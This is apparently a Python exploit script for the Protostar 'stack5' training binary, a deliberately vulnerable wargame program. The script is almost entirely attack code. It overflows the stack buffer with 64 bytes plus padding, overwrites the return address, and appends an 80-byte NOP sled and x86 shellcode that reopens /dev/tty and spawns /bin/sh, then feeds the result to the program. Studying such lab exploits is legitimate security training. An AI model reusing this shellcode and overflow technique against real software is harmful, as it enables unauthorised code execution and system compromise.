import subprocess
import struct
import string

program = "/opt/protostar/bin/stack5"

offset = "A"*64 + "aaaabbbbcccc"

stack = struct.pack("I", 0xbffff7c0+32)
nops = "\x90"*80
payload = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

string = offset + stack + nops + payload
print(string)

process = subprocess.Popen([program], stdin=subprocess.PIPE)
process.communicate(string)

